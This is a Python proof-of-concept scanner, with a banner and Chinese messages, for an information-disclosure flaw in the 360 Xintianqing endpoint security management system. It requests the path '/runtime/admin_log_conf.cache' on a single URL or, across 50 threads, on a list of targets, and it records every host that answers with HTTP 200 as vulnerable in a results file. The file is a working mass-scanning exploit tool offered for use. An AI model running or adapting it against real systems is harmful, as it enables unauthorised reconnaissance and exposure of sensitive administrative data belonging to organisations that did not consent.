import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner ="""██████╗  ██████╗  ██████╗      ██╗  ██╗██╗███╗   ██╗████████╗██╗ █████╗ ███╗   ██╗ ██████╗ ██╗███╗   ██╗ ██████╗ 
╚════██╗██╔════╝ ██╔═████╗     ╚██╗██╔╝██║████╗  ██║╚══██╔══╝██║██╔══██╗████╗  ██║██╔═══██╗██║████╗  ██║██╔════╝ 
 █████╔╝███████╗ ██║██╔██║█████╗╚███╔╝ ██║██╔██╗ ██║   ██║   ██║███████║██╔██╗ ██║██║   ██║██║██╔██╗ ██║██║  ███╗
 ╚═══██╗██╔═══██╗████╔╝██║╚════╝██╔██╗ ██║██║╚██╗██║   ██║   ██║██╔══██║██║╚██╗██║██║▄▄ ██║██║██║╚██╗██║██║   ██║
██████╔╝╚██████╔╝╚██████╔╝     ██╔╝ ██╗██║██║ ╚████║   ██║   ██║██║  ██║██║ ╚████║╚██████╔╝██║██║ ╚████║╚██████╔╝
╚═════╝  ╚═════╝  ╚═════╝      ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝   ╚═╝   ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚══▀▀═╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝ 
                                                                                                                 

"""
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description="360-新天擎终端安全管理系统信息泄露漏洞")
    parser.add_argument('-u','-url',dest='url',type=str,help="Please input your URL")
    parser.add_argument('-f','-file',dest='file',type=str,help="Please input your File path")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8')as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload = "/runtime/admin_log_conf.cache"
    try:
        res1 = requests.get(url=target+payload)
        if res1.status_code == 200:
            print(f"[+]{target}存在漏洞")
            with open('360result.txt','a')as f:
                f.write(target+'\n')
        else:
            print(f"[-]{target}不存在漏洞")
    except:
        pass

if __name__ == "__main__":
    main()
